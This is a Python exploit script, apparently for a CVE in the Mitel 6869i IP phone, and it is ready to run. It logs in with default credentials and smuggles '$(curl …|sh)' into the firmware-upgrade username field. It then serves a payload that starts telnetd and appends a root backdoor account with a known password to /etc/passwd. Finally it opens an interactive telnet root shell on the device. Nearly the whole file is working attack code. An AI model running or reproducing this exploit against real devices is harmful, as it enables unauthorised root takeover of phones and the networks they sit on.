#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# author: Kyle Burns
import argparse, sys
import http.server
import socketserver
import threading
import os
import requests

# remove warnings...
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

import time
import telnetlib

class SingleRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

        self.wfile.write(
            b"telnetd &\r\necho 'qwerty:$1$fbBQkK9u$Bo2eWTs4.vuM02UEAczu8.:0:0:root:/:/bin/sh' >> /etc/passwd" # qwerty:qwerty
        )

        threading.Thread(target=self.shutdown_server, daemon=True).start()

    def shutdown_server(self):
        self.server.shutdown()

def run_server():
    with socketserver.TCPServer(('', 80), SingleRequestHandler) as httpd:
        print('Serving payload on port 80...')
        httpd.serve_forever()

def patch(ip: str, username: str, password: str, callback: str):

    endpoint = 'https://{}/'.format(ip)
    req = requests.get((endpoint + 'upgrade.html'), verify=False) # requires an inital request before auth.

    req = requests.get((endpoint + 'upgrade.html'), auth=(username, password),verify=False)
    if req.status_code == 401:
        print('Unable to authenticate to Mitel 6869i Application.')
        sys.exit(1)

    # patch username parameter.
    payload = '$(curl+{}|sh)'.format(callback)
    data = 'file=qwerty.st&protocol=ftp&server=0.0.0.0&username={}&password=qwerty'.format(payload)

    # Used for development.
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }

    req = requests.post((endpoint + 'upgrade.html'), auth=(username, password), data=data,verify=False, proxies=proxies)

    if 'Unable to upgrade firmware.' not in req.text:
        print('Unable to smuggle command into `username` parameter. ')
        sys.exit(1)
    else:
        print('Smuggle command successfully...')
        return True

def main(ip: str, app_username: str, app_password: str, callback: str):
    server_thread = threading.Thread(
        target=run_server,
        daemon=True
    )
    server_thread.start()
    patch(ip, app_username, app_password, callback)
    time.sleep(5)

    conn(ip, '23', 'qwerty', 'qwerty')

def conn(host: str, port: str, username: str, password: str):
    try:
        tn = telnetlib.Telnet(host, port, timeout=10)
        tn.read_until(b'login: ')
        tn.write(username.encode('ascii') + b'\n')

        if password:
            tn.read_until(b'Password: ')
            tn.write(password.encode('ascii') + b'\n')

        output = tn.read_until(b'# ', timeout=2).decode('ascii')
        if '#' not in output:
            print('Login incorrect.')
            return
        else:
            print('Connected to {}:{}'.format(host, port))

        while True:
            user_input = input('(session) ')
            if user_input.lower() == 'exit':
                print('Connection closed by foreign host.')
                sys.exit(1)

            tn.write(user_input.encode('ascii') + b'\n')
            conn_out = (tn.read_until(b'# ').decode('ascii').split('\n'))
            print('\n'.join(conn_out[1:-1]))

    except Exception as e:
        print('An error occurred:', e)
    finally:
        tn.close()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='CVE-2024-XXXX implementation.')
    parser.add_argument('--debug', action='store_true', help='Verbose output for debugging and visual amazement (Default: False).')
    parser.add_argument('ip', action='store', help='Mitel 6869i Application IP')
    parser.add_argument('callback', action='store', help='IP used by Mitel 6869i to request the payload.')
    parser.add_argument('-username', action='store', help='Mitel 6869i Application username (Default: admin).', default='admin')
    parser.add_argument('-password', action='store', help='Mitel 6869i Application password (Default: 22222).', default='22222')

    if len(sys.argv) == 1:
        parser.print_help()
        exit(1)

    args = parser.parse_args()
    if args.debug == True:
        print(args)
    if os.geteuid() != 0:
        print('Run as root.')
        sys.exit(1)

    main(args.ip, args.username, args.password, args.callback)
